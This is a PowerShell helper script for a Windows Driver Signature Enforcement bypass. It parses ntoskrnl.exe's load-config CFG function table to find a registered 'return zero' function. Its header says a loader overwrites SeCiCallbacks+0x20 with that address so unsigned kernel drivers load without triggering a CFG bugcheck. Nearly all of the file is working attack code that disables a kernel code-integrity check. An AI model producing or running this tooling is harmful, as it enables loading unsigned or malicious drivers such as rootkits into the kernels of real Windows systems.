<#
    safe-rva.ps1 - resolve a "return STATUS_SUCCESS" thunk inside ntoskrnl .text.

    The DSE-bypass loader repoints SeCiCallbacks+0x20 at the RVA this script
    prints. That slot is called through the kernel's CFG dispatcher:

        0x140009407C5  mov  rax,qword ptr [nt!SeCiCallbacks+0x20]
        0x140009407CC  call guard_dispatch_icall

    so the target has to be a *registered* CFG function target, not an arbitrary
    byte pattern. An unregistered mid-function gadget fails the CFG check and
    the machine takes a KERNEL_SECURITY_CHECK_FAILURE bugcheck instead of
    loading the driver.

    This script walks the image's load-config GuardCFFunctionTable (the same
    table the kernel builds its CFG bitmap from) and returns the first entry
    that is a real function whose whole body is `xor eax,eax / ret`, preferring
    the nonpaged .text section. STATUS_SUCCESS for any argument list, always
    resident, always a legal indirect-call target.

    Prints the RVA as 0x-hex on stdout. Exit code 1 if nothing usable is found.
#>
[CmdletBinding()]
param(
    [string]$KernelImage = (Join-Path $env:SystemRoot 'System32\ntoskrnl.exe')
)

$ErrorActionPreference = 'Stop'

function Read-PeImage {
    param([string]$Path)

    $bytes = [System.IO.File]::ReadAllBytes($Path)
    if ($bytes.Length -lt 0x40 -or $bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) {
        throw "not a PE image: $Path"
    }

    $peOffset = [System.BitConverter]::ToInt32($bytes, 0x3C)
    if ($bytes[$peOffset] -ne 0x50 -or $bytes[$peOffset + 1] -ne 0x45) {
        throw "invalid PE header: $Path"
    }

    $magic      = [System.BitConverter]::ToUInt16($bytes, $peOffset + 24)
    $sectionCount = [System.BitConverter]::ToUInt16($bytes, $peOffset + 6)
    $optionalSize = [System.BitConverter]::ToUInt16($bytes, $peOffset + 20)
    $dataDir      = if ($magic -eq 0x20B) { $peOffset + 24 + 112 } else { $peOffset + 24 + 96 }
    $sectionTable = $peOffset + 24 + $optionalSize

    $sections = @()
    for ($i = 0; $i -lt $sectionCount; $i++) {
        $entry = $sectionTable + ($i * 40)
        $sections += [pscustomobject]@{
            Name      = [System.Text.Encoding]::ASCII.GetString($bytes, $entry, 8).TrimEnd([char]0)
            Virtual   = [System.BitConverter]::ToUInt32($bytes, $entry + 12)
            VirtualSize = [System.BitConverter]::ToUInt32($bytes, $entry + 8)
            Raw       = [System.BitConverter]::ToUInt32($bytes, $entry + 20)
            RawSize   = [System.BitConverter]::ToUInt32($bytes, $entry + 16)
            Flags     = [System.BitConverter]::ToUInt32($bytes, $entry + 36)
        }
    }

    [pscustomobject]@{
        Bytes      = $bytes
        Sections   = $sections
        DataDir    = $dataDir
        LoadConfig = [pscustomobject]@{
            Rva  = [System.BitConverter]::ToUInt32($bytes, $dataDir + (10 * 8))
            Size = [System.BitConverter]::ToUInt32($bytes, $dataDir + (10 * 8) + 4)
        }
    }
}

function Get-RawOffset {
    param($Image, [uint32]$Rva)

    foreach ($s in $Image.Sections) {
        if ($Rva -ge $s.Virtual -and $Rva -lt ($s.Virtual + $s.RawSize)) {
            return [int]($s.Raw + ($Rva - $s.Virtual))
        }
    }
    return -1
}

function Get-SectionName {
    param($Image, [uint32]$Rva)

    foreach ($s in $Image.Sections) {
        if ($Rva -ge $s.Virtual -and $Rva -lt ($s.Virtual + $s.VirtualSize)) { return $s.Name }
    }
    return '?'
}

$image = Read-PeImage -Path $KernelImage
$bytes = $image.Bytes

# ---- zero-return function shapes -------------------------------------------
$shapes = @(
    [byte[]](0x33, 0xC0, 0xC3),                    # xor eax,eax ; ret
    [byte[]](0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3),  # mov eax,0 ; ret
    [byte[]](0x2B, 0xC0, 0xC3)                     # sub eax,eax ; ret
)

function Test-ZeroReturn {
    param([int]$Offset)

    foreach ($shape in $shapes) {
        $ok = $true
        for ($j = 0; $j -lt $shape.Length; $j++) {
            if ($bytes[$Offset + $j] -ne $shape[$j]) { $ok = $false; break }
        }
        if ($ok) { return $true }
    }
    return $false
}

# ---- preferred path: the CFG function table the kernel actually uses --------
$cfRva = $image.LoadConfig.Rva
if ($cfRva -gt 0) {
    $cfOffset = Get-RawOffset -Image $image -Rva $cfRva
    if ($cfOffset -ge 0) {
        # ntoskrnl stores bit 30 alongside these RVAs (0x40E0A740 for
        # __security_cookie, 0x40171000 for the CF table); mask it off.
        $tableRva  = [System.BitConverter]::ToUInt32($bytes, $cfOffset + 0x80) -band 0x3FFFFFFF
        $tableCount = [System.BitConverter]::ToUInt32($bytes, $cfOffset + 0x88)
        $guardFlags = [System.BitConverter]::ToUInt32($bytes, $cfOffset + 0x90)

        # IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK: extra bytes per entry, flags are there
        $stride = 4 + [int](($guardFlags -shr 28) -band 0xF)
        $tableOffset = Get-RawOffset -Image $image -Rva $tableRva

        if ($tableOffset -ge 0 -and $tableCount -gt 0 -and $tableCount -lt 1000000) {
            $fallback = -1
            for ($i = 0; $i -lt $tableCount; $i++) {
                $rva = [System.BitConverter]::ToUInt32($bytes, $tableOffset + ($i * $stride))
                if ($stride -eq 4) { $rva = $rva -band 0xFFFFFFF0 }
                if ($rva -eq 0) { continue }

                $raw = Get-RawOffset -Image $image -Rva $rva
                if ($raw -lt 0) { continue }
                if (-not (Test-ZeroReturn -Offset $raw)) { continue }

                if ((Get-SectionName -Image $image -Rva $rva) -eq '.text') {
                    '0x{0:X}' -f $rva
                    exit 0
                }
                if ($fallback -lt 0) { $fallback = [int]$rva }
            }

            if ($fallback -ge 0) {
                '0x{0:X}' -f $fallback
                exit 0
            }

            Write-Error "no CFG-registered zero-return thunk found in $KernelImage"
            exit 1
        }
    }
}

# ---- fallback: no CFG table in this image, so no CFG check to satisfy --------
$text = $image.Sections | Where-Object { $_.Name -eq '.text' } | Select-Object -First 1
if ($null -eq $text) {
    Write-Error ".text section not found: $KernelImage"
    exit 1
}

$limit = [Math]::Min([int]$text.VirtualSize, [int]$text.RawSize) - 8
for ($i = 0; $i -lt $limit; $i++) {
    $raw = [int]$text.Raw + $i
    if (Test-ZeroReturn -Offset $raw) {
        '0x{0:X}' -f ([uint32]$text.Virtual + [uint32]$i)
        exit 0
    }
}

Write-Error "no 'xor eax,eax / ret' thunk found in .text of $KernelImage"
exit 1
